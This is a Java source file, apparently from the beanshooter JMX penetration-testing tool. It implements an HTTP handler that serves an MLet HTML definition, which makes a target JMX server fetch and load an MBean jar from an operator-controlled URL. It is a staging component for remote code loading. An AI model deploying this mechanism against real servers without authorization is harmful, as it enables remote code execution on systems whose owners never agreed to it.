package de.qtc.beanshooter.networking;

import java.io.File;
import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.URL;
import java.nio.file.Files;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;

import de.qtc.beanshooter.io.Logger;


/**
 * The MLetHandler class is responsible for serving the MLet HTML description for loading
 * MBeans using getMBeansFromURL. Furthermore, it exposes functionality to export the MLet
 * HTML to the file system.
 *
 * @author Tobias Neitzel (@qtc_de)
 */
@SuppressWarnings("restriction")
public class MLetHandler implements HttpHandler {

    private final String url;
    private final String jarName;
    private final String mBeanClass;
    private final String objectName;
    private final String mLetResponse;
    private final StagerServer parent;

    private static final String mLet = "<html><mlet code=\"%s\" archive=\"%s\" name=\"%s\" codebase=\"%s\"></mlet></html>";

    /**
     * Initializes the MLetHandler object.
     *
     * @param url the URL where the MBean can be loaded from
     * @param beanClass the class that is implemented by the bean
     * @param jarName the name of the Jar file to load from the URL
     * @param objectName the objectName of the MBean to load
     * @param stagerOnly whether or not the parent StagerServer was spawned by the stager action
     */
    public MLetHandler(URL url, String beanClass, String jarName, String objectName, StagerServer parent)
    {
        this.url = url.toString();
        this.jarName = jarName;
        this.mBeanClass = beanClass;
        this.objectName = objectName;
        this.parent = parent;

        this.mLetResponse = String.format(mLet, mBeanClass, jarName, objectName, url);

        if (url.getHost().equals("0.0.0.0"))
        {
            Logger.printlnMixedYellowFirst("Warning:", "Using a non routable address for the stager server is probably not what you want.");
            Logger.printlnMixedYellowFirst("Warning:", "Incomming connections will not know how to connect after obtaining the MLet definition.");
        }
    }

    /**
     * Print information about the MLet HTML that is returned by the handler.
     */
    private void printInfo()
    {
        Logger.printlnMixedBlue(Logger.padRight("Class:", 10), mBeanClass);
        Logger.printlnMixedBlue(Logger.padRight("Archive:", 10), jarName);
        Logger.printlnMixedBlue(Logger.padRight("Object:", 10), objectName);

        if( parent != null && parent.isStagerOnly() )
            Logger.printMixedBlue(Logger.padRight("Codebase:", 10), url);
        else
            Logger.printlnMixedBlue(Logger.padRight("Codebase:", 10), url);
    }

    /**
     * Export the MLet HTML to the file system.
     *
     * @param filename file system path to export to.
     * @throws IOException
     */
    public void export(String filename) throws IOException
    {
        Logger.printlnMixedYellow("Exporting MLet HTML file to:", filename);
        Logger.increaseIndent();

        printInfo();

        Logger.decreaseIndent();

        File file = new File(filename);
        Files.write(file.toPath(), mLetResponse.getBytes());
    }

    /**
     * Handles an incoming HTTP request to the MLetHandler path. Returns the MLet HTML string
     * to incoming client requests.
     */
    public void handle(HttpExchange t) throws IOException
    {
        if( parent.isStagerOnly() ) {
            Logger.printlnPlain("");
            Logger.lineBreak();
        }

        String requestURL = t.getRequestURI().toString();
        InetSocketAddress requestee = t.getRemoteAddress();

        Logger.printlnMixedYellow("Incoming request from:", requestee.getHostName());
        Logger.printlnMixedYellow("Requested resource:", requestURL);

        Logger.println("Sending mlet:");
        Logger.lineBreak();
        Logger.increaseIndent();

        printInfo();
        Logger.decreaseIndent();

        if( !parent.isStagerOnly() )
            Logger.lineBreak();

        t.sendResponseHeaders(200, mLetResponse.length());
        OutputStream os = t.getResponseBody();
        os.write(mLetResponse.getBytes());
        os.close();
    }
}
